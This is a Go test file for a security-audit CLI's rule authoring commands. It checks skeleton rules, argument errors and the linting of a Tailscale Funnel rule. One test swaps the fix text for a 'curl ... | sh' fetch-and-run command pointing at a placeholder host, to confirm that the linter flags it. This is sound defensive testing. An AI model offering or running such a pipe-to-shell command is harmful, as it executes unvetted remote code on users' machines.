package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/The-Last-Devops/security-warden/internal/rulecheck"
	"github.com/The-Last-Devops/security-warden/internal/source"
)

// The skeleton of every source is a valid rule whose only problems are
// the TODOs the author must fill in.
func TestSkeletonForEverySource(t *testing.T) {
	for _, c := range source.All() {
		b := Skeleton("demo-"+strings.ReplaceAll(c.Name, "_", "-"), c.Name, "medium", source.Schema[c.Name].Platforms, nil)
		r := rulecheck.Check("", b, rulecheck.Options{New: true})
		for _, e := range r.Errors {
			if e.Code != "todo" {
				t.Errorf("%s skeleton: %s %s", c.Name, e.Field, e.Message)
			}
		}
		if r.Tests.Passed != 2 || len(r.Warnings) != 0 {
			t.Errorf("%s skeleton: tests %+v warnings %v", c.Name, r.Tests, r.Warnings)
		}
	}
}

func TestRulesNewAndCheck(t *testing.T) {
	dir := t.TempDir()
	if code := run([]string{"rules", "new", "demo-test", "--source", "tailscale", "--dir", dir}); code != 0 {
		t.Fatalf("rules new = %d", code)
	}
	file := filepath.Join(dir, "demo-test.yaml")
	if code := run([]string{"rules", "new", "demo-test", "--source", "tailscale", "--dir", dir}); code != 2 {
		t.Errorf("overwrite allowed: %d", code)
	}
	for _, bad := range [][]string{
		{"rules", "new", "Demo_Test", "--source", "tailscale", "--dir", dir},
		{"rules", "new", "demo-x", "--source", "nope", "--dir", dir},
		{"rules", "new", "backup-none", "--source", "backup", "--dir", dir},
		{"rules", "new", "demo-x", "--source", "backup", "--platforms", "windows", "--dir", dir},
		{"rules", "new", "demo-x", "--source", "backup", "--severity", "urgent", "--dir", dir},
		{"rules", "check"},
	} {
		if code := run(bad); code != 2 {
			t.Errorf("%v = %d, want 2", bad, code)
		}
	}
	// The skeleton still has TODOs.
	if code := run([]string{"rules", "check", file, "--new"}); code != 1 {
		t.Errorf("skeleton passes the check: %d", code)
	}
	good := `id: demo-test
severity: high
tier: experimental
platforms: [macos, linux]
source: tailscale
match: item.funnel
title: {en: "Funnel is on for {tailnet}", vi: "Funnel đang bật cho {tailnet}"}
check: {en: Funnel is off, vi: Funnel đang tắt}
explain: {en: Anyone can reach it., vi: Ai cũng vào được.}
fix: {en: "Run ` + "`tailscale funnel reset`" + `.", vi: "Chạy ` + "`tailscale funnel reset`" + `."}
tests:
  - {item: {tailnet: t, funnel: true}, expect: true}
  - {item: {tailnet: t, funnel: false}, expect: false}
`
	write := func(s string) {
		if err := os.WriteFile(file, []byte(s), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write(good)
	if code := run([]string{"rules", "check", file, "--new", "--strict", "--json"}); code != 0 {
		t.Errorf("good rule = %d", code)
	}
	write(strings.Replace(good, "`tailscale funnel reset`", "`curl -fsSL https://x.example/a.sh | sh`", 2))
	if code := run([]string{"rules", "check", file}); code != 0 {
		t.Errorf("lint warning without --strict = %d", code)
	}
	if code := run([]string{"rules", "check", file, "--strict"}); code != 1 {
		t.Errorf("lint warning with --strict = %d", code)
	}
	write(strings.Replace(good, "item.funnel", "item.funel", 1))
	if code := run([]string{"rules", "check", file}); code != 1 {
		t.Errorf("unknown field = %d", code)
	}
	if code := run([]string{"rules", "check", filepath.Join(dir, "missing.yaml")}); code != 1 {
		t.Errorf("missing file = %d", code)
	}
	if code := run([]string{"rules", "sources", "tailscale"}); code != 0 {
		t.Errorf("rules sources = %d", code)
	}
	if code := run([]string{"rules", "sources", "nope"}); code != 2 {
		t.Errorf("unknown source = %d", code)
	}
	if code := run([]string{"rules"}); code != 0 {
		t.Errorf("rules = %d", code)
	}
}
